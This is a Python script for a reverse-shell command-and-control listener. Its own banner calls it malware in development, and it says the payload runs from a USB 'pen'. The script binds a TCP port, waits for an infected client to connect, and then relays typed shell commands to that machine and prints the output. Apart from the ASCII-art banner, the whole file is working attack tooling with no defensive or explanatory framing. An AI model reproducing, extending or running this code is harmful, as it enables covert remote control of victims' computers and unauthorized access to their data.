import socket
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"

print("")
print("")
print(Fore.RED + "Sorry for this Warning : ", end="");print("This malwere is under the Cunstruction. malwere have some bugs")
print("")
print(Fore.RED + "Warning : ", end="");print("pleas change server port and ip details in clientd.txt in your pen")
print("")
print(Fore.RED + "warning : ", end="");print("your pen is runing malwere")
print("")
print("")
print(Fore.BLUE + "	       __________	      __________    \\-\\  /-/")
print(Fore.BLUE + "\\\\	    // ||_/_/_/_/| ||\\\\    || ||_/_/_/_/|    \\ \\/ /")
print(Fore.BLUE + " \\\\	   //  ||________  || \\\\   || ||________      \\ \\/")
print(Fore.BLUE + "  \\\\	  //   ||_/_/_/_/| ||  \\\\  || ||_/_/_/_/|     /\\*\\")
print(Fore.BLUE + "   \\\\    //    ||________  ||   \\\\ || ||________     / /\\ \\")
print(Fore.BLUE + "    \\\\__//     ||_/_/_/_/| ||    \\\\|| ||_/_/_/_/|   / /  \\ \\")
print(Fore.BLUE + "     \"--\"      		   ||     \\||		   /_/    \\_\\")
print("")
print("")


serverIp = input("Enter Host Ip addres: ")
print("")
serverPort = input("Enter Host Port (press Enter for 80): ")

if not serverPort:
    # Assign a default port number, for example, 8080
    serverPort = 80
serverPort = int(serverPort)
#creat an IPv4 TCP socket 
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#bind the docket tot a public host, and well-known port
serversocket.bind((serverIp, serverPort))

# beacome a sever socket
serversocket.listen(5)


while True:
    # accept connections from outside
    anim = "/"
    conn = None
    serversocket.settimeout(0.5)

    while not conn:
        print("\rLisning client..."+ anim, end="", flush=True)
        if anim == "/":
            anim = "|"
        elif anim == "|":
            anim = "\\"
        elif anim == "\\":
            anim = "/"
        
        try:
            conn, addr = serversocket.accept()
            break
        except:
            continue
            
    

        

    
    print("\r-")
    print(f"Connected to {addr[0]}")
    # now do something with the clientsocket
    # in this case, we'll pretend this is a threaded server
    while True:

        shell_command = input("~$>")
        
        

        try:
            conn.send(shell_command.encode())
            result = conn.recv(1024).decode()
            print(result)
        except:
            print("Connection closed!")
            print("")
            newConn = input("Are you want to make new lisiner (y/n)\n")
            if newConn == "y" or newConn == "Y":
                break
            else:
                exit("Programe distroed")
                
            
